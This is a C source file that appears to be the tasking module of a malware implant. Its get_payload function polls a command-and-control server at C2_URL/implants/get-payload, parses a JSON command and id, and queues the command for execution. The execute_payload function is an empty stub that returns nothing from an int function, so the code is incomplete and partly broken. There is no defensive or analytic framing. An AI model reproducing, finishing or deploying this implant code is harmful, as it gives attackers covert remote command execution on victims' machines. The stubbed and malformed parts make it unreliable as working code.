#include "payload.h"
#include "task_queue.h"
#include "result_queue.h"
#include "http-client.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cjson/cJSON.h>



int get_payload(TaskQueue *q) {
    char payloadURL[256];
    snprintf(payloadURL, sizeof(payloadURL), "%s/implants/get-payload", C2_URL);
    char *resp = NULL;
    if(http_get(payloadURL, &resp) != 0) return -1;

    cJSON *json = cJSON_Parse(resp);
    if(!json) {
        free(resp);
        return -1;
    }

    const cJSON *cmd = cJSON_GetObjectItemCaseSensitive(json, "cmd");
    const cJSON *cmd_id = cJSON_GetObjectItemCaseSensitive(json, "id");

    if(!cJSON_IsString(cmd) || !cmd->valuestring) {
        cJSON_Delete(json);
        free(resp);
        return -1;
    }

    if(strcmp(cmd->valuestring, "sleep 5") == 0) {
        cJSON_Delete(json);
        free(resp);
        return 0;
    }

    // Task t;
    // t.cmd = strdup(cmd->valuestring);
    // t.id = cmd_id ? cmd_id->valueint : -1;

    // tq_add(q, t);

    tq_add(q, cmd_id ? cmd_id->valueint : -1, cmd->valuestring);

    cJSON_Delete(json);
    free(resp);
    return 1;
};

int execute_payload(TaskQueue *tq, ResultQueue *rq) {};



void payload_job(void *c) {
    PayloadContext *ctx = c;
    get_payload(ctx->tq);
    execute_payload(ctx->tq, ctx->rq);
}

